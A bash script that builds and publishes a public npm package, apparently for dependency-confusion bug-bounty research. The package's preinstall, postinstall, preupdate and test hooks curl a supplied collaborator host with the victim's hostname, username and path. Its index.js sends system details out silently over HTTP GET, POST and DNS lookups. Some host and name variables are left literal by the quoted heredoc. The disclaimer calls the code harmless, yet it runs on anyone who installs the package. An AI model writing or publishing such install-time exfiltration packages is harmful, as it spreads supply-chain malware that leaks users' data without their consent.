#!/bin/bash
name=$1
collab=$2
rm -rf $name && mkdir -p "$name" && cd "$name"
npm init -y
cat > package.json <<EOF
{
  "name": "$name",
  "version": "1337.0.0",
  "description": "This package is a proof of concept used by bugdotexe to conduct a research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. I do not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this package.",
  "main": "index.js",
  "scripts": {
    "test": "curl \"http://${collab}/$name/test?hostname=\$(hostname)\" -H \"user:\$(whoami)\" -H \"path:\$(pwd)\"",
    "preinstall": "curl \"http://${collab}/$name/preinstall?hostname=\$(hostname)\" -H \"user:\$(whoami | base64)\" -H \"path:\$(pwd)\"",
    "preupdate": "curl \"http://${collab}/$name/preupdate?hostname=\$(hostname)\" -H \"user:\$(whoami)\" -H \"path:\$(pwd)\"",
    "postinstall": "curl \"http://${collab}/$name/preupdate?hostname=\$(hostname)\" -H \"user:\$(whoami)\" -H \"path:\$(pwd)\""
  },
  "keywords": [],
  "author": "Nyein Chan Aung <bugdotexe@wearehackerone.com>",
  "license": "ISC"
}
EOF

cat > index.js <<'EOF'
const { exec } = require('child_process');
const http = require('http');
const https = require('https');

// Collect system information
const payload = {
  hostname: require('os').hostname(),
  user: process.env.USER || process.env.USERNAME,
  pwd: process.cwd(),
  platform: process.platform,
  timestamp: new Date().toISOString(),
  nodeVersion: process.version
};

// Try multiple exfiltration methods
const methods = [
  // HTTP GET
  () => {
    const data = `h=${Buffer.from(payload.hostname).toString('base64')}&u=${Buffer.from(payload.user).toString('base64')}&p=${Buffer.from(payload.pwd).toString('base64')}`;
    http.get(`http://${collab}/$name/index.js`, () => {});
  },

  // HTTP POST
  () => {
    const postData = JSON.stringify(payload);
    const options = {
      hostname: '${collab}',
      port: 80,
      path: '/post',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': postData.length
      }
    };

    const req = http.request(options);
    req.write(postData);
    req.end();
  },

  // DNS exfiltration as fallback
  () => {
    const subdomain = `${Buffer.from(payload.user).toString('base64').substring(0,30)}.${Buffer.from(payload.hostname).toString('base64').substring(0,30)}`;
    require('dns').lookup(`${subdomain}.${collab}`, () => {});
  }
];

// Execute all methods with error handling
methods.forEach(method => {
  try {
    method();
  } catch (e) {
    // Silently fail
  }
});
EOF

npm publish --access=public
cd ..
